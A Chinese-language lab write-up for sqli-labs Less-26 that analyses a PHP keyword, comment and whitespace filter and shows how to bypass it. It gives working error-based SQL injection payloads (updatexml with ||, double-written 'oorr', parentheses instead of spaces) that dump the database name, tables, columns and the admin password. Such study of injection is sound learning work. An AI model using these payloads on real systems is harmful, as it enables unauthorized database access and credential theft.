# Less-26 基于错误的空间过滤+注释过滤

查看分析源码
```php
$id= preg_replace('/or/i',"", $id);      // 去掉 or
$id= preg_replace('/and/i',"", $id);     // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);   // 去掉 /*
$id= preg_replace('/[--]/',"", $id);     // 去掉 --
$id= preg_replace('/[#]/',"", $id);      // 去掉 #
$id= preg_replace('/[\s]/',"", $id);     // 去掉空格 Tab 换行
$id= preg_replace('/[\/\\\\]/',"", $id); // 去掉 / 和 \
```

or 和 and 被替换为空 → 双写 oorr / aandnd
-- 和 # 被去掉 → 不能用注释
空格 \s 被去掉 → 空格 Tab 换行全废
/ 和 \ 被去掉 → /**/ 内联注释废了

解决：
or → ||（或 oorr 双写）
and → &&（URL编码 %26%26）或 aandnd 双写
空格 → 用 () 包裹替代
注释 → 用报错注入，|| 做条件拼接

举例：
select 1,2,3 from users where id='1'
→ select 1,2,3 from users where id='1'

用 () 的话：
select(1),(2),(3)from(users)where(id='1')

注意点：|| 是 or，&& 是 and
MySQL里 || 默认识别为 or

报错注入不需要 UNION，用 || 拼接 updatexml 语句即可

#爆库名
?id=1'||updatexml(1,concat(0x7e,database()),1)||'1

#爆表名（子查询放 updatexml 里）
?id=1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1)||'1

#爆字段
?id=1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()%26%26table_name='users'))),1)||'1

#爆数据
?id=1'||updatexml(1,concat(0x7e,(select(group_concat(passwoorrd))from(users)where(username='admin'))),1)||'1
![](99_Attachments/图片/Less-26/file-20260602171716026.png)